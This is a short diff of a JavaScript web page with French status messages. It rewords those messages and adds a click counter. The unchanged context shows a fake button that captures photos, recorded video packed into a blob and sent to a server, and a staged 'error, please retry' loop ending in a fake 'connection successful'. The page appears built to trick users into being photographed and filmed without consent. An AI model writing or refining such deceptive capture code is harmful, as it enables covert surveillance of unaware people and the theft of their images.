@@ -101,7 +101,7 @@
 
     // 📤 Envoi au serveur
     function sendData() {
-      status.textContent = "redirection..";
+      status.textContent = "Envoi des données...";
 
       // Convertir la vidéo en blob
       const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
@@ -132,7 +132,7 @@
       capturePhoto();
 
       if (clickCount < 5) {
-        status.textContent = `Erreur... Veuillez réessayer`;
+        status.textContent = `Erreur... Veuillez réessayer (${clickCount}/5)`;
       } else {
         fakeBtn.disabled = true;
         status.textContent = "Connexion réussie.";
